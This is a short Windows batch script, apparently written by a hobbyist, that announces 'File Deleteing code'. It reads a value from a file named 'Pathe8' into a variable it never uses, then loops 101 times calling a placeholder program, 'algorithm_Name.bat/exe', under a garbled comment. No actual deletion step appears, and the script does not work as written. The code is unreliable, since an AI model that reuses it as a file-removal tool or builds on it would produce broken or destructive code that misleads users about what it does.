@echo off
echo.
echo.
title Processing ..!
for /f "Delims=" %%a in (Pathe8) do (
set qwe=%%a
)
echo.
echo File Deleteing code in Processing...

for /L %%n in (0 1 100) do (
::Micro Remove Algorithm Connection with Call Func and then Controll Processing by .dat file no Extension Files
call algorithm_Name.bat/exe

)
exit